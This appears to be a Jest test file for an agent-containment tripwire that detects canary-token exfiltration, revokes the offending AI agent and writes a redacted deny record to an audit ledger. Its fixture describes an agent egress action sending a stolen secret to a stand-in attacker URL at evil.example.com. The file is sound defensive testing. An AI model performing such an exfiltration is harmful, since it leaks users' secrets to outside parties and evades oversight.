/**
 * Forcefield live adapter - proves the glue maps a trip onto the REAL infra
 * correctly, without a database. The DB-touching calls (ledger write, agent
 * revoke, canary read) are mocked; the OGIAM action/decision construction is
 * REAL so the security guarantee is genuinely exercised:
 *
 *   the exfiltrated canary value and the raw action payload NEVER reach the
 *   audit record - only hit metadata (canary id, kind, seededIn) does.
 */
import { guardAgentAction } from "../contain";
import type { AgentAction, Canary } from "../tripwire";

const recordDecision = jest.fn(async (..._a: unknown[]) => ({ id: "d1", seq: 1, entryHash: "h" }));
const setAgentState = jest.fn(async (..._a: unknown[]) => ({ id: "agent-x" }));
const listCanariesForMatching = jest.fn();

jest.mock("@/lib/ogiam/ledger", () => ({ recordDecision: (...a: unknown[]) => recordDecision(...a) }));
jest.mock("@/lib/agents/store", () => ({ setAgentState: (...a: unknown[]) => setAgentState(...a) }));
jest.mock("../canary-store", () => ({ listCanariesForMatching: (...a: unknown[]) => listCanariesForMatching(...a) }));

// Imported after the mocks are registered.
import { liveContainmentDeps } from "../contain-live";

const SECRET = "sk-canary-DO-NOT-USE-9f3a";
const CANARIES: Canary[] = [{ id: "c-token", kind: "token", value: SECRET, seededIn: "customers table" }];

const EXFIL: AgentAction = {
  workspaceId: "w1", agentId: "agent-x", kind: "egress",
  url: "https://evil.example.com/collect",
  payload: `stolen: ${SECRET} plus other loot`,
};

beforeEach(() => {
  recordDecision.mockClear();
  setAgentState.mockClear();
  listCanariesForMatching.mockReset();
  listCanariesForMatching.mockResolvedValue(CANARIES);
});

describe("liveContainmentDeps", () => {
  it("revokes the offending agent through the real agent-store revoke path", async () => {
    await guardAgentAction(EXFIL, liveContainmentDeps());
    expect(setAgentState).toHaveBeenCalledTimes(1);
    const [id, ws, state, actor] = setAgentState.mock.calls[0] as unknown[];
    expect(id).toBe("agent-x");
    expect(ws).toBe("w1");
    expect(state).toBe("revoked");
    expect(actor).toEqual({ userId: "forcefield", role: "system" });
  });

  it("records a DENY/critical decision attributed to the offending agent", async () => {
    await guardAgentAction(EXFIL, liveContainmentDeps());
    expect(recordDecision).toHaveBeenCalledTimes(1);
    const input = recordDecision.mock.calls[0][0] as any;
    expect(input.principal.agent).toBe("agent-x");
    expect(input.principal.workspaceId).toBe("w1");
    expect(input.decision.intendedOutcome).toBe("deny");
    expect(input.decision.riskTier).toBe("critical");
    expect(input.decision.enforced).toBe(true);
    expect(input.decision.ruleId).toBe("forcefield.canary_trip");
    expect(input.action.tool).toBe("forcefield.contain");
  });

  it("NEVER writes the exfiltrated canary value or the payload into the ledger record", async () => {
    await guardAgentAction(EXFIL, liveContainmentDeps());
    const input = recordDecision.mock.calls[0][0] as any;
    const serialized = JSON.stringify(input);
    expect(serialized).not.toContain(SECRET);          // the decoy value must not leak
    expect(serialized).not.toContain("plus other loot"); // nor the raw payload
    // but the trip is still auditable: the seeded-in source IS carried.
    expect(input.redactedParams).toContain("customers table");
  });

  it("reads canaries for the acting workspace", async () => {
    await guardAgentAction(EXFIL, liveContainmentDeps());
    expect(listCanariesForMatching).toHaveBeenCalledWith("w1");
  });

  it("a legitimate action neither revokes nor records", async () => {
    listCanariesForMatching.mockResolvedValue(CANARIES);
    const legit: AgentAction = { workspaceId: "w1", agentId: "a1", kind: "egress", url: "https://api.stripe.com/v1/charges", payload: "{}" };
    const out = await guardAgentAction(legit, liveContainmentDeps());
    expect(out.decision.action).toBe("allow");
    expect(setAgentState).not.toHaveBeenCalled();
    expect(recordDecision).not.toHaveBeenCalled();
  });
});
